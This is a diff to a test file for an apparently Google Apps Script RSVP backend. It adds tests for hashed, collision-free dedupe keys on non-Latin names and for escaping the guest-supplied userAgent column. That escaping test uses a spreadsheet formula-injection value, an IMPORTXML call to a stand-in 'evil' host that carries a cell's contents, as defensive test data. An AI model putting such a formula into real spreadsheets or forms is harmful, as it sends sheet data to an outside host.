@@ -53,6 +53,14 @@ globalThis.ContentService = {
   createTextOutput: t => ({ setMimeType() { return { _t: t }; } }),
 };
 globalThis.Logger = { log() {} };
+const { createHash } = await import('node:crypto');
+globalThis.Utilities = {
+  DigestAlgorithm: { MD5: 'MD5' },
+  Charset: { UTF_8: 'UTF_8' },
+  // Apps Script hands back signed bytes; mirror that so the hex loop is tested.
+  computeDigest: (_alg, value) =>
+    [...createHash('md5').update(value, 'utf8').digest()].map(b => (b > 127 ? b - 256 : b)),
+};
 
 vm.runInThisContext(fs.readFileSync(new URL('../Code.gs', import.meta.url), 'utf8'));
 const { doGet, doPost } = globalThis;
@@ -125,5 +133,33 @@ assert.equal(parse(doPost({})).error, 'INVALID_BODY');
 assert.equal(parse(doPost({ postData: { contents: '{oops' } })).error, 'INVALID_JSON');
 assert.equal(post({ action: 'nope' }).error, 'INVALID_ACTION');
 assert.equal(parse(doGet()).error, 'INVALID_ACTION', 'there is nothing to read back');
+
+// --- dedupe key -----------------------------------------------------------
+// Names in a non-Latin script must not share a cache key: the second guest to
+// reply inside the cooldown was being turned away as a duplicate.
+cache.clear();
+assert.equal(post(accept({ names: '김민준' })).ok, true);
+const firstKey = [...cache.keys()][0];
+assert.equal(parse(doPost({ postData: { contents: JSON.stringify(accept({ names: '이서연' })) } })).ok,
+  true, 'a different non-Latin name must not collide');
+assert.equal(new Set(cache.keys()).size, 2, 'distinct names get distinct keys');
+assert.ok(/^rsvp-[0-9a-f]{32}$/.test(firstKey), `key should be hashed, got ${firstKey}`);
+
+cache.clear();
+assert.equal(post(accept({ names: 'Jo Park' })).ok, true);
+assert.equal(parse(doPost({ postData: { contents: JSON.stringify(accept({ names: 'jo-park' })) } })).ok,
+  true, 'different spellings are different guests');
+
+// An identical resubmission is still absorbed.
+cache.clear();
+const twice = { postData: { contents: JSON.stringify(accept({ names: '김민준' })) } };
+assert.equal(parse(doPost(twice)).ok, true);
+assert.equal(parse(doPost(twice)).error, 'RATE_LIMITED', 'exact repeat is still caught');
+
+// --- userAgent escaping ---------------------------------------------------
+cache.clear();
+post(accept({ names: 'Escaping Test', userAgent: '=IMPORTXML("http://evil/?"&A2,"//a")' }));
+assert.equal(sheet.rows.at(-1)[7].startsWith("'"), true,
+  'userAgent is guest-supplied and must be escaped like every other column');
 
 console.log('backend: all assertions passed');
